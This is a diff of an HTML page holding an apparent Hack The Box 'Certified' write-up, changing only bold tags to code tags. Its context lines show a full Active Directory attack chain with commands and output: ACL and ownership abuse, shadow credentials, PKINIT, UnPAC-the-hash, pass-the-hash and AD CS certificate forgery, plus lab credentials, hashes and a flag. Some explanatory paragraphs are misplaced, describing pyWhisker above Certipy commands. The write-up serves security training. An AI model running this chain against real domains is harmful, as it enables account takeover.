@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Certified is a Medium difficulty Windows Active Directory machine. Starting with provided credentials, the attack path involves collecting AD data for BloodHound, discovering a <strong>WriteOwner</strong> relationship over a management group, and chaining AD privilege abuse techniques: modifying group membership, adding a <strong>Shadow Credential</strong> via <code>pyWhisker</code>, obtaining a TGT using <strong>PKINITtools</strong>, and extracting NTLM hashes. The escalation continues through <strong>AD CS (Active Directory Certificate Services)</strong> abuse to forge a certificate as Administrator.</p>
+      <p>Certified is a Medium difficulty Windows Active Directory machine. Starting with provided credentials, the attack path involves collecting AD data for BloodHound, discovering a <code>WriteOwner</code> relationship over a management group, and chaining AD privilege abuse techniques: modifying group membership, adding a <code>Shadow Credential</code> via <code>pyWhisker</code>, obtaining a TGT using <code>PKINITtools</code>, and extracting NTLM hashes. The escalation continues through <code>AD CS (Active Directory Certificate Services)</code> abuse to forge a certificate as Administrator.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250212134637.png" alt="HTB machine info — credentials provided" loading="lazy" /><span class="img-caption">HTB machine info — credentials provided</span></div>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
@@ -220,7 +220,7 @@ smb: \&gt; excit
 excit: command not found
 smb: \&gt; exit</code></pre></div>
       <h3 class="writeup-sub-title">BloodHound Data Collection</h3>
-      <p>I collect LDAP data and upload it to <strong>BloodHound</strong> to visualize the AD attack surface.</p>
+      <p>I collect LDAP data and upload it to <code>BloodHound</code> to visualize the AD attack surface.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified]
 └─$ nxc ldap 10.129.231.186 -u judith.mader -p judith09 --bloodhound --collection All --dns-server 10.129.231.186</code></pre></div>
       <p>I use <code>netexec</code> (nxc) with the <code>--bloodhound</code> flag to collect comprehensive Active Directory data via LDAP queries. This gathers users, groups, computers, GPOs, ACLs, trusts, sessions, and SPNs — everything BloodHound needs to map out attack paths. The output is saved as a ZIP file that can be imported directly into the BloodHound GUI for visual attack path analysis.</p>
@@ -234,10 +234,10 @@ LDAP        10.129.231.186  389    DC01             Compressing output into /hom
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250207104453.png" alt="BloodHound data loaded successfully" loading="lazy" /><span class="img-caption">BloodHound data loaded successfully</span></div>
       <h2 class="writeup-section-title">Foothold: AD Privilege Chain</h2>
       <h3 class="writeup-sub-title">Attack Path Discovery</h3>
-      <p>BloodHound reveals that <code>judith.mader</code> has <strong>WriteOwner</strong> rights over the <code>Management</code> group, and the Management group has <strong>GenericWrite</strong> rights over the <code>management_svc</code> user. This creates a chain: take ownership → modify group membership → abuse GenericWrite.</p>
+      <p>BloodHound reveals that <code>judith.mader</code> has <code>WriteOwner</code> rights over the <code>Management</code> group, and the Management group has <code>GenericWrite</code> rights over the <code>management_svc</code> user. This creates a chain: take ownership → modify group membership → abuse GenericWrite.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250207105124.png" alt="WriteOwner → GenericWrite attack path in BloodHound" loading="lazy" /><span class="img-caption">WriteOwner → GenericWrite attack path in BloodHound</span></div>
       <h3 class="writeup-sub-title">Taking Ownership & Modifying Rights</h3>
-      <p>First, I give <code>judith.mader</code> the <strong>WriteMembers</strong> right on the Management group, enabling me to add myself.</p>
+      <p>First, I give <code>judith.mader</code> the <code>WriteMembers</code> right on the Management group, enabling me to add myself.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified/impacket/examples]
 └─$ python3 owneredit.py -action write -new-owner &#x27;judith.mader&#x27; -target &#x27;management&#x27; &#x27;certified.htb&#x27;/&#x27;judith.mader&#x27;:&#x27;judith09&#x27; 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -247,20 +247,20 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] - sAMAccountName: Domain Admins
 [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
 [*] OwnerSid modified successfully!</code></pre></div>
-      <p>I use <code>dacledit.py</code> to modify the DACL (Discretionary Access Control List) of the target AD object, granting our controlled account <strong>FullControl</strong> permissions. FullControl is the most permissive right in Active Directory — it allows reading/writing all properties, changing permissions, deleting the object, and performing any operation on it. With this level of access, I can change the target's password, modify group memberships, or add Shadow Credentials.</p>
+      <p>I use <code>dacledit.py</code> to modify the DACL (Discretionary Access Control List) of the target AD object, granting our controlled account <code>FullControl</code> permissions. FullControl is the most permissive right in Active Directory — it allows reading/writing all properties, changing permissions, deleting the object, and performing any operation on it. With this level of access, I can change the target's password, modify group memberships, or add Shadow Credentials.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified/impacket/examples]
 └─$ sudo python3 dacledit.py -action &#x27;write&#x27; -rights &#x27;WriteMembers&#x27; -principal &#x27;judith.mader&#x27; -target &#x27;Management&#x27; &#x27;certified.htb&#x27;/&#x27;judith.mader&#x27;:&#x27;judith09&#x27; -dc-ip 10.129.65.70
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] DACL backed up to dacledit-20250212-112645.bak
 [*] DACL modified successfully!</code></pre></div>
-      <p>With the WriteMembers permission now granted, I add <code>judith.mader</code> to the <strong>Management</strong> group. This is a critical step because the Management group has <strong>GenericWrite</strong> rights over the <code>management_svc</code> service account — meaning once I'm in the group, I can modify that account's properties, including adding Shadow Credentials for authentication.</p>
+      <p>With the WriteMembers permission now granted, I add <code>judith.mader</code> to the <code>Management</code> group. This is a critical step because the Management group has <code>GenericWrite</code> rights over the <code>management_svc</code> service account — meaning once I'm in the group, I can modify that account's properties, including adding Shadow Credentials for authentication.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified/impacket/examples]
 └─$ net rpc group members &quot;Management&quot; -U &quot;certified.htb&quot;/&quot;judith.mader&quot;%&quot;judith09&quot; -S &quot;CERTIFIED.HTB&quot;                                                         
 CERTIFIED\judith.mader
 CERTIFIED\management_svc</code></pre></div>
       <h3 class="writeup-sub-title">Shadow Credentials Attack (pyWhisker)</h3>
-      <p><strong>Shadow Credentials</strong> is an AD attack where an attacker adds a Key Credential to a target user's <code>msDS-KeyCredentialLink</code> attribute. This allows certificate-based (PKINIT) authentication to the target account without knowing its password. I use <code>pyWhisker</code> to add a shadow credential to the <code>management_svc</code> user.</p>
+      <p><code>Shadow Credentials</code> is an AD attack where an attacker adds a Key Credential to a target user's <code>msDS-KeyCredentialLink</code> attribute. This allows certificate-based (PKINIT) authentication to the target account without knowing its password. I use <code>pyWhisker</code> to add a shadow credential to the <code>management_svc</code> user.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified/pywhisker/pywhisker]
 └─$ python3 pywhisker.py -d &quot;certified.htb&quot; -u &quot;judith.mader&quot; -p &quot;judith09&quot; --target &quot;management_svc&quot; --action &quot;add&quot; 
 [*] Searching for the target account
@@ -275,7 +275,7 @@ CERTIFIED\management_svc</code></pre></div>
 [*] Must be used with password: XyyUNqCDbvXssMMKApTw
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</code></pre></div>
       <h3 class="writeup-sub-title">PKINIT Authentication & Hash Extraction</h3>
-      <p>Using <strong>PKINITtools</strong> — a set of tools for Kerberos PKINIT authentication — I perform three steps: request a TGT using the shadow credential certificate, export the Kerberos session, and extract the user's NTLM hash.</p>
+      <p>Using <code>PKINITtools</code> — a set of tools for Kerberos PKINIT authentication — I perform three steps: request a TGT using the shadow credential certificate, export the Kerberos session, and extract the user's NTLM hash.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
 └─$ faketime &quot;$(ntpdate -q 10.129.65.70 | cut -d &#x27; &#x27; -f 1,2)&quot; \                                       
 python gettgtpkinit.py -cert-pfx /home/kali/HTB/Certified/pywhisker/pywhisker/266Dhk4q.pfx -pfx-pass XyyUNqCDbvXssMMKApTw certified.htb/management_svc hhh.ccache
@@ -289,10 +289,10 @@ INFO:minikerberos:AS-REP encryption key (you might need this later):
 INFO:minikerberos:503d53525222c00e04b9c0a42a0f475a7b63baf779e3e9e7c4e64d4a07799883
 2025-02-12 20:09:46,405 minikerberos INFO     Saved TGT to file
 INFO:minikerberos:Saved TGT to file</code></pre></div>
-      <p>I use <strong>pyWhisker</strong> to add a <em>Shadow Credential</em> (msDS-KeyCredentialLink) to the target account. This enables certificate-based authentication without knowing the user's password.</p>
+      <p>I use <code>pyWhisker</code> to add a <em>Shadow Credential</em> (msDS-KeyCredentialLink) to the target account. This enables certificate-based authentication without knowing the user's password.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
 └─$ export KRB5CCNAME=/home/kali/HTB/Certified/pywhisker/pywhisker/PKINITtools/hhh.ccache</code></pre></div>
-      <p>I use <code>getnthash.py</code> to extract the user's NTLM hash from the Kerberos session using the <strong>U2U</strong> (User-to-User) mechanism. This technique, known as <strong>UnPAC-the-Hash</strong>, works by requesting a U2U service ticket that contains the user's PAC (Privilege Attribute Certificate), from which the NT hash can be derived. The hash enables Pass-the-Hash attacks without ever knowing the plaintext password.</p>
+      <p>I use <code>getnthash.py</code> to extract the user's NTLM hash from the Kerberos session using the <code>U2U</code> (User-to-User) mechanism. This technique, known as <code>UnPAC-the-Hash</code>, works by requesting a U2U service ticket that contains the user's PAC (Privilege Attribute Certificate), from which the NT hash can be derived. The hash enables Pass-the-Hash attacks without ever knowing the plaintext password.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
 └─$ faketime &quot;$(ntpdate -q 10.129.65.70 | cut -d &#x27; &#x27; -f 1,2)&quot; \                  
 python getnthash.py -key 503d53525222c00e04b9c0a42a0f475a7b63baf779e3e9e7c4e64d4a07799883 certified.htb/management_svc
@@ -315,7 +315,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\management_svc\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; cd ..
 ls
 *Evil-WinRM* PS C:\Users\management_svc&gt; ls
@@ -354,7 +354,7 @@ Mode                LastWriteTime         Length Name
       <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">640d9d5032e082c213131c6e0576fe16</code></div>
       <h2 class="writeup-section-title">Privilege Escalation: AD CS Certificate Abuse</h2>
       <h3 class="writeup-sub-title">BloodHound Path to Administrator</h3>
-      <p>I follow a BloodHound attack path from the <code>ca_operator</code> account to the Administrator, leveraging <strong>Active Directory Certificate Services (AD CS)</strong> misconfiguration.</p>
+      <p>I follow a BloodHound attack path from the <code>ca_operator</code> account to the Administrator, leveraging <code>Active Directory Certificate Services (AD CS)</code> misconfiguration.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250212133133.png" alt="Attack path from ca_operator to Administrator" loading="lazy" /><span class="img-caption">Attack path from ca_operator to Administrator</span></div>
       <h3 class="writeup-sub-title">Certificate Enrollment & Forgery</h3>
       <p>Using Pass-the-Hash with <code>management_svc</code>'s hash, I connect to the target and retrieve the CA configuration.</p>
@@ -362,7 +362,7 @@ Mode                LastWriteTime         Length Name
 └─$ pth-net rpc password &quot;ca_operator&quot; &quot;Test123&quot; -U &quot;certified.htb&quot;/&quot;management_svc&quot;%&quot;a091c1832bcdd4677c28b5a6a1295584&quot;:&quot;a091c1832bcdd4677c28b5a6a1295584&quot;  -S &quot;DC01.certified.htb&quot;
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...</code></pre></div>
-      <p>I use <strong>pyWhisker</strong> to add a <em>Shadow Credential</em> (msDS-KeyCredentialLink) to the target account. This enables certificate-based authentication without knowing the user's password.</p>
+      <p>I use <code>pyWhisker</code> to add a <em>Shadow Credential</em> (msDS-KeyCredentialLink) to the target account. This enables certificate-based authentication without knowing the user's password.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
 └─$ certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.129.65.70
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -388,7 +388,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Updating user &#x27;ca_operator&#x27;:
     userPrincipalName                   : Administrator
 [*] Successfully updated &#x27;ca_operator&#x27;</code></pre></div>
-      <p>I use <strong>pyWhisker</strong> to add a <em>Shadow Credential</em> (msDS-KeyCredentialLink) to the target account. This enables certificate-based authentication without knowing the user's password.</p>
+      <p>I use <code>pyWhisker</code> to add a <em>Shadow Credential</em> (msDS-KeyCredentialLink) to the target account. This enables certificate-based authentication without knowing the user's password.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
 └─$ certipy-ad req -username ca_operator@certified.htb -p Test123 -ca certified-DC01-CA -template CertifiedAuthentication -debug
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -421,7 +421,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator&gt; cd desktop
 *Evil-WinRM* PS C:\Users\Administrator\desktop&gt; ls
 
